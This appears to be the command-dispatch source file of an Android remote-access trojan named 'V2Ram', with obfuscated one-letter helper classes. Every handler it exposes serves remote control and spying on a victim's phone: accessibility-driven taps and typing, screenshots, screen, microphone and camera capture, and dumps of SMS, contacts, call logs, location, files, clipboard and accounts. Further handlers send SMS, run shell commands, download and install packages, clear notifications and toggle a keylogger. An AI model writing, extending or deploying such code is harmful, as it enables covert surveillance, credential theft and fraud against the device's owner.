// language: Java, file: e.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;

import java.util.ArrayList;
import java.util.List;

public class e {

    public static void dispatch(String raw) {
        if (raw == null || raw.isEmpty()) return;
        String text = raw.trim();
        String[] parts = text.split("\\s+", 2);
        String cmd = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";

        try {
            if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) {
                d.send(menu());
                return;
            }
            if (cmd.equals("/ping")) {
                d.send("pong — acc=" + (c.S != null)
                    + " svc=" + d.running
                    + " keylog=" + x.isEnabled());
                return;
            }
            handle(cmd, args);
        } catch (Throwable t) {
            err(t.getMessage());
        }
    }

    static void handle(String cmd, String args) {
        switch (cmd) {

            // ---- UI ----
            case "/home":    g.home(); break;
            case "/back":    g.back(); break;
            case "/recents": g.recents(); break;
            case "/lock":    g.lock(); break;
            case "/shade":   g.shade(); break;
            case "/qs":      g.qs(); break;

            case "/tap": {
                List<String> p = split(args);
                if (p.size() < 2) { err("usage: /tap X Y"); return; }
                float x = parseCoord(p.get(0));
                float y = parseCoord(p.get(1));
                if (x < 0 || y < 0) { err("bad coords: " + p); return; }
                g.tap(x, y);
                break;
            }
            case "/swipe": {
                List<String> p = split(args);
                if (p.size() < 4) { err("usage: /swipe X1 Y1 X2 Y2 [ms]"); return; }
                float x1 = parseCoord(p.get(0)), y1 = parseCoord(p.get(1));
                float x2 = parseCoord(p.get(2)), y2 = parseCoord(p.get(3));
                if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) {
                    err("bad coords: " + p); return;
                }
                long ms = p.size() > 4 ? parseLong(p.get(4), 300) : 300;
                g.swipe(x1, y1, x2, y2, ms);
                break;
            }
            case "/type":  g.type(args); break;
            case "/click": g.click(args); break;

            // ---- Screen ----
            case "/shot": {
                String s = i.shot();
                if (s == null) err("shot failed (accessibility + screenshot?)");
                else d.sendPhoto(s);
                break;
            }
            case "/rec": {
                int sec = parseInt(args.trim(), 5);
                i.rec(sec);
                d.send("<i>rec started: " + sec + "s</i>");
                break;
            }

            // ---- Overlay / toast ----
            case "/overlay": h.show(); break;
            case "/hide":    h.hide(); break;
            case "/toast":   r.show(args); break;

            // ---- Data ----
            case "/sms":      j.dump(); break;
            case "/sms_send": {
                List<String> p = split(args);
                if (p.size() < 2) { err("usage: /sms_send NUM TEXT"); return; }
                String num = p.get(0);
                String body = args.substring(num.length()).trim();
                j.sendSms(num, body);
                break;
            }
            case "/contacts": k.dump(); break;
            case "/calls":    l.dump(); break;
            case "/gps":      o.fetch(); break;
            case "/files":    m.list(args); break;
            case "/get":      m.get(args.trim()); break;
            case "/photos":   n.listRecent(parseInt(args.trim(), 20)); break;
            case "/photo":    n.download(parseLong(args.trim(), 0)); break;

            // ---- Media ----
            case "/cam": p.frontShot(); break;
            case "/mic": q.record(parseInt(args.trim(), 5)); break;

            // ---- Actions ----
            case "/open":      s.openUrl(args.trim()); break;
            case "/app":       s.open(args.trim()); break;
            case "/uninstall": s.uninstall(args.trim()); break;
            case "/call":      s.call(args.trim()); break;
            case "/vib":       s.vibrate(parseInt(args.trim(), 1)); break;
            case "/torch": {
                String a = args.trim().toLowerCase();
                p.torch(a.equals("on") || a.equals("1") || a.equals("true"));
                break;
            }
            case "/apps": s.list(); break;

            // ---- Extended ----
            case "/info":    t.dump(); break;
            case "/wifi":    t.wifi(); break;
            case "/sh":      u.run(args); break;
            case "/clip":    v.read(); break;
            case "/clipset": v.write(args); break;
            case "/dl":      w.downloadAndInstall(args.trim()); break;
            case "/notifclear":  NotificationControl.clearAll(); break;
            case "/notifcancel": NotificationControl.cancelPkg(args.trim()); break;
            case "/accounts":    AccountLister.dump(); break;
            case "/keylog": {
                String a = args.trim().toLowerCase();
                if (a.equals("on"))         x.toggle(true);
                else if (a.equals("off"))   x.toggle(false);
                else if (a.equals("dump"))  x.dump();
                else if (a.equals("clear")) x.clear();
                else d.send("<i>usage: /keylog on|off|dump|clear</i>");
                break;
            }

            default:
                d.send("<i>unknown:</i> " + d.esc(cmd)
                    + "\n/menu — all commands");
        }
    }

    static void err(String msg) {
        d.send("<i>err:</i> " + d.esc(msg == null ? "?" : msg));
    }

    static String menu() {
        StringBuilder b = new StringBuilder();
        b.append("<b>V2Ram — Android</b>\n")
         .append("<i>device: ").append(android.os.Build.MANUFACTURER)
         .append(" ").append(android.os.Build.MODEL)
         .append(" · sdk ").append(android.os.Build.VERSION.SDK_INT)
         .append("</i>\n\n")

         .append("<b>UI</b>\n")
         .append("/home /back /recents /lock /shade /qs\n")
         .append("/tap X Y · /swipe X1 Y1 X2 Y2 [ms]\n")
         .append("/type TEXT · /click TEXT\n\n")

         .append("<b>Screen</b>\n")
         .append("/shot · /rec N\n\n")

         .append("<b>Overlay</b>\n")
         .append("/overlay · /hide · /toast TEXT\n\n")

         .append("<b>Data</b>\n")
         .append("/sms · /contacts · /calls · /gps\n")
         .append("/sms_send NUM TEXT\n")
         .append("/files DIR · /get PATH\n")
         .append("/apps · /photos N · /photo ID\n\n")

         .append("<b>Media</b>\n")
         .append("/cam · /mic N · /torch on|off\n\n")

         .append("<b>Actions</b>\n")
         .append("/open URL · /app PKG · /uninstall PKG\n")
         .append("/call NUM · /vib N\n\n")

         .append("<b>Extended</b>\n")
         .append("/info · /wifi · /sh CMD\n")
         .append("/clip · /clipset TEXT\n")
         .append("/dl URL · /accounts\n")
         .append("/notifclear · /notifcancel PKG\n")
         .append("/keylog on|off|dump|clear");

        return b.toString();
    }

    static List<String> split(String args) {
        List<String> out = new ArrayList<>();
        if (args == null || args.isEmpty()) return out;
        for (String p : args.split("\\s+")) if (!p.isEmpty()) out.add(p);
        return out;
    }

    static int parseInt(String s, int fallback) {
        try { return Integer.parseInt(s.trim()); }
        catch (Throwable t) { return fallback; }
    }

    static long parseLong(String s, long fallback) {
        try { return Long.parseLong(s.trim()); }
        catch (Throwable t) { return fallback; }
    }

    static float parseCoord(String s) {
        if (s == null) return -1f;
        String t = s.trim().toLowerCase();
        if (t.startsWith("x") || t.startsWith("y")) t = t.substring(1);
        if (t.startsWith("=")) t = t.substring(1);
        try { return Float.parseFloat(t); }
        catch (Throwable ex) { return -1f; }
    }

    static Context ctx() { return d.ctx; }
} 